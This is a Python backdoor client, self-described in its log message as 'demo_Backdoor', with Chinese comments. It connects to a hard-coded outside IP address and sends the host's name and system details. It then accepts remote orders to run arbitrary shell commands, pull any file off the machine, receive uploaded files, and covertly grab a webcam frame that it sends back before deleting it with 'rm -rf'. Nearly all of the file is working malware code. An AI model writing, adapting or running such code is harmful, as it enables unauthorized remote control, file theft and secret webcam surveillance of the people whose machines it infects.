import os
import socket
import subprocess
import logging
import struct
import platform
import sys
import time
import cv2
import numpy as np
 

logging.basicConfig(level = logging.DEBUG,format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s')

def ExecuteCommand(client_socket):
    while True:
        try:
            #接收命令
            command = client_socket.recv(1024).decode('gb2312')
            commandList = command.split()
            #单独处理路径变换
            if commandList[0] == "exit":
                break
            elif commandList[0] == "cd":
                os.chdir(commandList[1])
                client_socket.sendall(os.getcwd().encode('gb2312'))
            elif commandList[0] == "pwd":
                client_socket.sendall(os.getcwd().encode('gb2312'))
            else:
                #执行并发送结果
                output=subprocess.check_output(command,shell=True)
                #这里将回显长度与内容一起发送，协调分块传输
                #output=output+(str(len(output))+'\nline\n').encode()
                #这里解决了执行无回显命令的bug
                if output==''.encode() or output==None:
                    client_socket.sendall("command no output".encode())
                    continue
                client_socket.sendall(output)

        except Exception as e:
            client_socket.sendall("Execute command failed, check your command!".encode())
        #报错跳出循环，重新进入并发送报错给主控端
        continue

def uploadFile(client_socket):
    while True:
        fileInfo=client_socket.recv(struct.calcsize('128s20s'))
        if fileInfo:
            fileName, fileSize = struct.unpack('128s20s', fileInfo)
            #去除多余字符
            fileName=fileName.decode().strip('\x00')
            fileSize=int(fileSize.decode().strip('\x00'))
            uploadPath=os.path.join('./',fileName)
            print("[+]文件信息接收完毕,{}大小为{}".format(fileName,fileSize))

            #接收文件
            recvSize=0
            print("[+]开始接收......")
            #分次分块写入
            #这里与download一样，写入的时候以w方式写入decode后的data
            with open(uploadPath,'w') as file:
                while recvSize != fileSize:
                    if (fileSize-recvSize) > 1024:
                        data_block=client_socket.recv(1024).decode()
                        file.write(data_block)
                        recvSize+=len(data_block)
                    else:
                        #最后一块直接传输
                        data_block=client_socket.recv(fileSize-recvSize).decode()
                        file.write(data_block)
                        recvSize=fileSize
                        break
            print("[+]接收完毕")
        break

def downloadFile(client_socket,path):
    while True:
        downloadPath=path
        if os.path.isfile(downloadPath):
        #将文件路径与文件大小打包并发送
            fileInfo=struct.pack("128s20s",bytes(os.path.basename(downloadPath).encode('utf-8')),bytes(str(os.stat(downloadPath).st_size).encode('utf-8')))
            client_socket.sendall(fileInfo)
            print("[+]文件信息发送完毕,filename: {} size: {}".format(os.path.basename(downloadPath),os.stat(downloadPath).st_size))
            logging.info("开始传输...")
            #分块传输，防止内存占用过多
            with open(downloadPath,'rb') as file:
                while True:
                    data_block=file.read(1024)
                    if not data_block:
                        print("[+]传输完成")
                        break
                    client_socket.sendall(data_block)
                break
    pass

def video_demo(client_socket):
    capture = cv2.VideoCapture(0)#0为电脑内置摄像头
    for i in range(50):

        ret, frame = capture.read()#摄像头读取,ret为是否成功打开摄像头,true,false。 frame为视频的每一帧图像
        frame = cv2.flip(frame, 1)#摄像头是和人对立的，将图像左右调换回来正常显示。
        #cv2.imshow("video", frame)
        datatime = str(int(time.time()))
        if i == 49:
            cv2.imwrite(str(datatime) + ".png", frame)
            pic_path=str(os.getcwd()) + '/' + str(datatime) + ".png" #获取当前图片路径
            client_socket.sendall(str(pic_path).encode('gb2312'))
            return str(pic_path)

def deleteFile(path):
    if 'macOS' in str(sysInfo):
        #print('this is mac')
        command = 'rm -rf ' + str(path)
        output=subprocess.check_output(command,shell=True)

    else:
        print("np")

        
        

if __name__ == "__main__":
    IP='180.76.162.68'
    PORT=8888
    logging.info("welcome to demo_Backdoor,trying to connect......")
    #与主控端建立连接
    client_socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((IP,PORT))

    #测试命令执行，发送hostname
    hostName=subprocess.check_output("hostname", shell=True)
    sysInfo=hostName+(platform.system()+'\n'+platform.architecture()[0]+'\n'+platform.platform()).encode()
    client_socket.sendall(sysInfo)

    #接收指令，decode并执行
    print("[+]开始连接主控...")
    while True:
        order=client_socket.recv(10).decode()
        if order == '1':
            ExecuteCommand(client_socket)
        elif order == '2':
            while True:
                #接收path并传输文件至主控端
                path= client_socket.recv(100).decode()
                if path:
                    downloadFile(client_socket,path)
                    break
                else:
                    continue
        elif order == '3':
            #接收主控端上传的文件
            uploadFile(client_socket)
        elif order == '4':
            path = video_demo(client_socket)
            downloadFile(client_socket,path)
            deleteFile(path)
        elif order == 'exit' :
            break
        else:
            pass



